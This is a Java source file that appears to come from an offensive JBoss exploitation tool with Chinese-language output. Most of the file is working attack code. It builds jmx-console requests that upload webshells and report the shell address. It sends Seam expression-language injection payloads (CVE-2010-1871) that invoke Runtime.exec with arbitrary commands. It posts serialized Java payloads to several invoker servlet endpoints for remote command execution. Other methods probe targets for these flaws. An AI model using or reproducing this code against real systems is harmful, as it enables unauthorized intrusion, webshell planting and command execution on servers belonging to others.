package org.ha1yu;


import org.apache.http.client.methods.CloseableHttpResponse;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UtilMethod {
    public UtilMethod() {
    }

    public static String uploadFile(int index, String targetUrl, String filePath, String fileContent) throws Exception {
        String result = null;
        String pageName = getRandomStr(4);
        String httpResult = null;
        String charset = "utf-8";
        String url;
        switch (index) {
            case 0:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIndex=5&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                result = getResult(targetUrl, filePath, pageName, httpResult);
                break;
            case 1:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                result = getResult(targetUrl, filePath, pageName, httpResult);
                break;
            case 2:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=" + pageName + ".war&argType=java.lang.String&arg1=" + filePath + "&argType=java.lang.String&arg2=&argType=java.lang.String&arg3=" + URLEncoder.encode(fileContent, "utf-8") + "&argType=boolean&arg4=True";
                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
                if (response != null) {
                    int statusCode = response.getStatusLine().getStatusCode();
                    switch (statusCode) {
                        case 200:
                            if (response.getFirstHeader("Content-Length") != null) {
                                result = "上传成功";
                                result = result + "\nshell地址:";
                                result = result + targetUrl + "/" + pageName + "/" + filePath;
                            } else {
                                result = "上传失败";
                            }

                            return result;
                        case 401:
                            result = "需要认证登录";
                            return result;
                        case 500:
                            result = "上传失败";
                            return result;
                        default:
                            result = "状态码为：" + statusCode;
                    }
                } else {
                    result = "网络连接错误";
                }
                break;
            case 3:
                fileContent = Base64.getEncoder().encodeToString(fileContent.getBytes());
                fileContent = fileContent.replaceAll("/", "%2f").replaceAll("/+", "%2b");
                url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7bexpressions.getClass().forName('java.io.FileOutputStream').getConstructor('java.lang.String',expressions.getClass().forName('java.lang.Boolean').getField('TYPE').get(null)).newInstance(('" + filePath + "'),false).write(expressions.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer(request.getParameter('c'))).close()%7d&c=" + fileContent;
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "网络连接错误";
                } else if (httpResult.contains("user=&conversationId")) {
                    result = "上传成功";
                } else {
                    result = "疑似未上传成功";
                }
                break;
            case 4:
            case 5:
            case 6:
            case 7:
                url = getExploitUrl(index, targetUrl, targetUrl);
                byte[] fileByte = fileContent.getBytes();
                byte[] payload = GenPoc.getObject(filePath, fileByte);
                byte[] exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
                String uploadResult = GenPoc.getCommandResult(exploitResult);
                if (uploadResult.contains("sun.reflect.annotation.AnnotationInvocationHandler") && uploadResult.contains("org.jboss.invocation.MarshalledInvocation")) {
                    result = "上传成功";
                } else {
                    result = "疑似未上传成功";
                }
        }

        return result;
    }

    private static String getResult(String targetUrl, String filePath, String pageName, String httpResult) {
        String result;
        if (httpResult == null) {
            result = "网络连接错误";
        } else if (httpResult.contains("Operation completed successfully without a return value")) {
            result = "上传成功";
            result = result + "\nshell地址:";
            result = result + targetUrl + "/" + pageName + "/" + filePath;
        } else {
            result = httpResult;
        }

        return result;
    }

    /**
     * 命令执行工具方法
     *
     * @param index     漏洞编号索引 0-7
     * @param targetUrl 目标url
     * @param cmd       命令
     * @param flag      uploadJarFlag
     * @return resp body
     * @throws Exception
     */
    public static String commandExploit(int index, String targetUrl, String cmd, boolean flag) throws Exception {
        String result = null;
        String charset = "utf-8";
        String url;
        if (index > 3) {
            url = getExploitUrl(index, targetUrl, targetUrl);
            byte[] payload;
            if (!flag) {
                try {
                    payload = GenPoc.getObject("../.readme.html.tmp", null);
                    byte[] b = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
                    if (b == null) {
                        result = "失败，可能访问超时！";
                        return result;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            payload = GenPoc.expolit(cmd);
            byte[] exploitResult = new byte[0];
            exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
            result = GenPoc.getCommandResult(exploitResult);
        } else if (index == 3) { // CVE-2010-1871
            String httpResult;
            if (cmd.equals("pwd")) {
                url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7brequest.getRealPath('/')%7d";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                String p = "user=(.*)&conversationId";
                result = getMatch(p, httpResult);
            } else {
                url = targetUrl + "/admin-console/index.seam?actionOutcome=/pwn.xhtml?user=%23%7bhtml?user=%23%7bexpressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('" + URLEncoder.encode(cmd) + "')%7d";
                httpResult = MainMethod.httpRequest(url, "utf-8", "GET");
                if (httpResult == null) {
                    result = "网络连接错误";
                } else if (httpResult.contains("user=java.lang.UNIXProcess")) {
                    url = targetUrl + "/admin-console/index.seam?actionOutcome=/success.xhtml?user%3d%23%7brequest.getRealPath('/')%7d";
                    httpResult = MainMethod.httpRequest(url, charset, "GET");
                    String p = "user=(.*)&conversationId";
                    String result_path = getMatch(p, httpResult);

                    result = "命令执行成功\n\r";
                    result = result + "获取到pwd路径：" + result_path + "\n\r";
                    result = result + "无法确认目标是否出网，建议手工验证";
                } else {
                    result = "命令执行失败";
                }
            }
        } else {
            result = "暂未实现";
        }

        return result;
    }

    private static String getExploitUrl(int index, String targetUrl, String url) {
        switch (index) {
            case 4:
                url = targetUrl + "/invoker/EJBInvokerServlet";
                break;
            case 5:
                url = targetUrl + "/invoker/JMXInvokerServlet";
                break;
            case 6:
                url = targetUrl + "/jbossmq-httpil/HTTPServerILServlet";
                break;
            case 7:
                url = targetUrl + "/invoker/readonly";
        }

        return url;
    }

    public static String vulCheck(int index, String targetUrl) throws Exception {
        String charset = "utf-8";
        String result = null;
        String url;
        String httpResult;
        int statusCode;
        switch (index) {
            case 0:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[0] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("MBean Inspector")) {
                    result = "存在" + Utils.bugs_mainTab[0] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[0] + "漏洞," + httpResult;
                }
                break;
            case 1:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[1] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("MBean Inspector")) {
                    result = "存在" + Utils.bugs_mainTab[1] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[1] + "漏洞," + httpResult;
                }
                break;
            case 2:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
                if (response != null) {
                    statusCode = response.getStatusLine().getStatusCode();
                    switch (statusCode) {
                        case 200:
                            if (response.getFirstHeader("Content-Length") != null) {
                                result = "存在" + Utils.bugs_mainTab[2] + "漏洞";
                            } else {
                                result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
                            }

                            return result;
                        case 401:
                            result = "需要认证登录";
                            return result;
                        case 500:
                            result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
                            return result;
                        default:
                            result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，状态码为：" + statusCode;
                    }
                } else {
                    result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，网络连接错误";
                }
                break;
            case 3:
                String str3 = UtilMethod.commandExploit(3, targetUrl, "echo xxx", false);
                if (str3.contains("未找到命令执行结果，命令可能执行失败！") || str3.contains("命令执行失败")
                        || str3.contains("网络连接错误")) {
                    result = "未找到命令执行结果，命令可能执行失败！";
                } else {
                    result = "存在" + Utils.bugs_mainTab[3] + "漏洞" + "【echo xxx：" + str3 + "】";
                }
                break;
            case 4:
                String str4 = UtilMethod.commandExploit(4, targetUrl, "echo xxx", false);
                if (str4.contains("未找到命令执行结果，命令可能执行失败！")) {
                    result = "未找到命令执行结果，命令可能执行失败！";
                } else if (str4.contains("失败，可能访问超时！")) {
                    result = str4;
                } else {
                    result = "存在" + Utils.bugs_mainTab[4] + "漏洞" + "【echo xxx：" + str4 + "】";
                }
                break;
            case 5:
                String str5 = UtilMethod.commandExploit(5, targetUrl, "echo xxx", false);
                if (str5.contains("未找到命令执行结果，命令可能执行失败！")) {
                    result = "未找到命令执行结果，命令可能执行失败！";
                } else if (str5.contains("失败，可能访问超时！")) {
                    result = str5;
                } else {
                    result = "存在" + Utils.bugs_mainTab[5] + "漏洞" + "【echo xxx：" + str5 + "】";
                }
                break;
            case 6:
                String str6 = UtilMethod.commandExploit(6, targetUrl, "echo xxx", false);
                if (str6.contains("未找到命令执行结果，命令可能执行失败！")) {
                    result = "未找到命令执行结果，命令可能执行失败！";
                } else if (str6.contains("失败，可能访问超时！")) {
                    result = str6;
                } else {
                    result = "存在" + Utils.bugs_mainTab[6] + "漏洞" + "【echo xxx：" + str6 + "】";
                }
                break;
            case 7:
                String str7 = UtilMethod.commandExploit(7, targetUrl, "echo xxx", false);
                if (str7.contains("未找到命令执行结果，命令可能执行失败！")) {
                    result = "未找到命令执行结果，命令可能执行失败！";
                } else if (str7.contains("失败，可能访问超时！")) {
                    result = str7;
                } else {
                    result = "存在" + Utils.bugs_mainTab[7] + "漏洞" + "【echo xxx：" + str7 + "】";
                }
                break;
        }

        return result;
    }

    public static String vulCheck1(int index, String targetUrl) {
        String charset = "utf-8";
        String result = null;
        String url;
        String httpResult;
        int statusCode;
        switch (index) {
            case 0:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[0] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("MBean Inspector")) {
                    result = "存在" + Utils.bugs_mainTab[0] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[0] + "漏洞," + httpResult;
                }
                break;
            case 1:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[1] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("MBean Inspector")) {
                    result = "存在" + Utils.bugs_mainTab[1] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[1] + "漏洞," + httpResult;
                }
                break;
            case 2:
                url = targetUrl + "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo";
                CloseableHttpResponse response = MainMethod.doHttpRequest(url, "HEAD");
                if (response != null) {
                    statusCode = response.getStatusLine().getStatusCode();
                    switch (statusCode) {
                        case 200:
                            if (response.getFirstHeader("Content-Length") != null) {
                                result = "存在" + Utils.bugs_mainTab[2] + "漏洞";
                            } else {
                                result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
                            }

                            return result;
                        case 401:
                            result = "需要认证登录";
                            return result;
                        case 500:
                            result = "不存在" + Utils.bugs_mainTab[2] + "漏洞";
                            return result;
                        default:
                            result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，状态码为：" + statusCode;
                    }
                } else {
                    result = "检测" + Utils.bugs_mainTab[2] + "漏洞失败，网络连接错误";
                }
                break;
            case 3:
                statusCode = 38123;
                int max = '鱀';
                int randomNum1 = statusCode + (int) (Math.random() * (double) (max - statusCode + 1));
                int randomNum2 = statusCode + (int) (Math.random() * (double) (max - statusCode + 1));
                long num = (long) (randomNum1 * randomNum2);
                url = targetUrl + "/admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b" + randomNum1 + "*" + randomNum2 + "%7d";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[3] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains(num + "")) {
                    result = "存在" + Utils.bugs_mainTab[3] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[3] + "漏洞";
                }
                break;
            case 4:
                url = targetUrl + "/invoker/EJBInvokerServlet";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[4] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("org.jboss.invocation.MarshalledValue")) {
                    result = "存在" + Utils.bugs_mainTab[4] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[4] + "漏洞," + httpResult;
                }
                break;
            case 5:
                url = targetUrl + "/invoker/JMXInvokerServlet";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[5] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("org.jboss.invocation.MarshalledValue")) {
                    result = "存在" + Utils.bugs_mainTab[5] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[5] + "漏洞," + httpResult;
                }
                break;
            case 6:
                url = targetUrl + "/jbossmq-httpil/HTTPServerILServlet";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[6] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("JBossMQ") && httpResult.contains("JBossMQ")) {
                    result = "存在" + Utils.bugs_mainTab[6] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[6] + "漏洞," + httpResult;
                }
                break;
            case 7:
                url = targetUrl + "/invoker/readonly";
                httpResult = MainMethod.httpRequest(url, charset, "GET");
                if (httpResult == null) {
                    result = "检测" + Utils.bugs_mainTab[7] + "漏洞失败，网络连接错误";
                } else if (httpResult.contains("PeekInputStream.readFully")) {
                    result = "存在" + Utils.bugs_mainTab[7] + "漏洞";
                } else {
                    result = "不存在" + Utils.bugs_mainTab[7] + "漏洞," + httpResult;
                }
        }

        return result;
    }

    public static boolean writeResult(String path, String content, boolean flag) {
        File f = new File(path);
        FileWriter fw = null;

        try {
            if (!f.exists()) {
                f.createNewFile();
            }

            fw = new FileWriter(f, flag);
            fw.write(content + "\r\n");
            fw.flush();
            fw.close();
        } catch (IOException var6) {
        }

        return f.exists();
    }

    public static String getFDate() {
        String result = null;
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddhhmmsss");
        result = sdf.format(new Date());
        return result;
    }

    public static String getMatch(String p, String line) {
        String result = null;
        Pattern pattern = Pattern.compile(p);
        Matcher m = pattern.matcher(line);
        if (m.find()) {
            result = URLDecoder.decode(m.group(1));
        }

        return result;
    }

    public static String getRandomStr(int len) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for (int i = 0; i < len; ++i) {
            int number = random.nextInt(62);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }
}
